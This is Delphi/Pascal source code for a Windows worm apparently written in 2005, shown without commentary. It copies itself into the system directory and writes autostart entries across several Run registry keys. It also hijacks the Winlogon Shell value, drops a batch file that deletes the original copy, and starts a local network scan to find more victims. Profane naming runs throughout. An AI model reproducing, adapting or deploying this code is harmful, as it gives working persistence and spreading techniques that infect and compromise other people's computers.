   program FuckBillGates;

   uses
     Windows,
     ShellApi,
     LANS in 'LANS.PAS';

   //      -- Set Registry Value --
   Procedure SetRegValue(kRoot: HKEY; Path, Value, Str: String);
   Var
     Key   :HKEY;
     Size  :Cardinal;
   Begin
     RegOpenKey(kRoot, pChar(Path), Key);
     Size := 2048;
     RegSetValueEx(Key, pChar(Value), 0, REG_SZ, @Str[1], Size);
     RegCloseKey(Key);
   End;

   //      -- Get System Directory --
   Function SysDir: String;
   Var
     Dir   :Array[0..255] Of Char;
   Begin
     GetSystemDirectory(Dir, 256);
     Result := String(Dir)+'\';
   End;

   //      -- Install --
   Procedure InstallWorm;
   Var
     Path  :String;
     Mutex :String;
     Handle:THandle;
     Bat   :TextFile;
   Begin
     Randomize;
     Sleep(Random(10000));

     Mutex := '- Fuck Bill Gates -';
     Handle := CreateMutexA(NIL, FALSE, pChar(Mutex));
     If (Handle = ERROR_ALREADY_EXISTS) Then
       ExitProcess(0);

     Path := SysDir + 'FuckGates.com';
     If (ParamStr(0) <> Path) Then
     Begin
       If (CopyFile(pChar(ParamStr(0)), pChar(Path), False)) Then
       Begin
         SetRegValue(HKEY_CURRENT_USER, 'software\microsoft\windows\currentversion\run', 'Fuck Gates', Path);
         SetRegValue(HKEY_CURRENT_USER, 'software\microsoft\windows\currentversion\runonce', 'Fuck Gates', Path);
         SetRegValue(HKEY_CURRENT_USER, 'software\microsoft\windows\currentversion\runonceex', 'Fuck Gates', Path);
         SetRegValue(HKEY_CURRENT_USER, 'software\microsoft\windows\currentversion\runservices', 'Fuck Gates', Path);

         SetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\run', 'Fuck Gates', Path);
         SetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\runonce', 'Fuck Gates', Path);
         SetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\runonceex', 'Fuck Gates', Path);
         SetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows\currentversion\runservices', 'Fuck Gates', Path);
         SetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows nt\currentversion\winlogon', 'Shell', 'Explorer.exe FuckGates.com');
       End;

         AssignFile(Bat, 'C:\FuckGates.Bat');
         ReWrite(Bat);

         WriteLn(Bat, '@ECHO OFF');
         writeLn(Bat, 'cls');
         writeLn(Bat, 'del "'+ParamStr(0)+'"');
         WriteLn(Bat, 'cls');
         WriteLn(Bat, 'Echo - Fuck Bill Gates - Fuck Microsoft -'#13#10'Echo - Created by blaZcan (c) 2005 -');
         WriteLn(Bat, 'echo  ');WriteLn(Bat, 'echo  ');
         WriteLn(Bat, 'pause');
         CloseFile(Bat);

         ShellExecute(0, 'open', pchar(path), nil, nil, 0);
         ShellExecute(0, 'open', 'c:\FuckGates.Bat', nil, nil, 1);
         ExitProcess(0);
     End;
   End;

   //      -- Worm Start Code --
   begin
     // Install our anti-m$ worm.
       InstallWorm;
     // Start Local Area Scanner to find more vics
       StartLocalScan(10);
     // Start Local Mail Scanner to find victim mails.

   end.
